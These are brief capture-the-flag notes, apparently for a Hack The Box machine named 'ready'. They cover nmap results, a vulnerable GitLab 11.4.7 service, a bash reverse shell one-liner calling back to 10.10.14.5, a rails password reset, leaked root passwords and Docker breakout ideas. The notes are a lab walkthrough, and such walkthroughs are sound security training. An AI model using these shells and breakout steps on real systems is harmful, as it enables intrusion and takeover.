# ready

- ip: 10.10.10.220

## nmap
```
Nmap scan report for 10.10.10.220
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
```

## port 5080: gitlab
- gitlab community edition 11.4.7
- gitlab: `Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`
- reverse shell: `bash -i >& /dev/tcp/10.10.14.5/9091 0>&1`
- email: `dude@ready.com`
- change email:
  - `$ gitlab-rails runner -e production 'u = User.find_by(username: "dude"); u.password="aaaaaaaa";u.password_confirmation="aaaaaaaa";u.save;'`
- root pass: `YG65407Bjqvv9A0a8Tm_7w`

## privesc (docker breakout) ideas
- `root_pass`? rabbit hole
- privileged flag? (yes) mount `/dev/sda2`
- root password (`/opt/backup/gitlab.rb`): `wW59U!ZKMbG9+*#h`
